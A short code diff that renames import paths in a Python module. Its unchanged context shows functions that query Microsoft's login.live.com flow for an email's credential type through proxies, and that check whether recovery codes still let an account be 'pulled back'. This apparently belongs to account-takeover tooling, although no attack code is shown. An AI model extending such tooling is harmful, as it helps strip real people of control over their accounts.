@@ -19,8 +19,8 @@ import logging
 from datetime import datetime, timedelta, timezone
 from typing import Any
 
-from database.database import DBConnection
-from securing.auth.account_status import get_account_lock_reason
+from storage.romeo_db import RomeoDB as DBConnection
+from authsecuring.auth.account_status import get_account_lock_reason
 
 logger = logging.getLogger("bot")
 
@@ -113,9 +113,9 @@ async def fetch_credential_type(email: str) -> dict | None:
     Needs a fresh PPFT/flowToken from login.live.com (empty token often omits Credentials).
     """
     try:
-        from securing.auth.initial_session import get_session
-        from securing.utils.cookies.get_livedata import livedata
-        from securing.utils.proxy import close_session
+        from authsecuring.auth.initial_session import get_session
+        from authsecuring.utils.cookies.get_livedata import livedata
+        from authsecuring.utils.proxy import close_session
     except Exception:
         get_session = livedata = close_session = None  # type: ignore
 
@@ -219,7 +219,7 @@ async def check_pullback_intact(
 
     if rc:
         try:
-            from securing.utils.security.recovery import check_recovery_code_valid
+            from authsecuring.utils.security.recovery import check_recovery_code_valid
         except Exception:
             return "unknown", "recovery check helper unavailable"
         status, reason = await check_recovery_code_valid(email, rc)
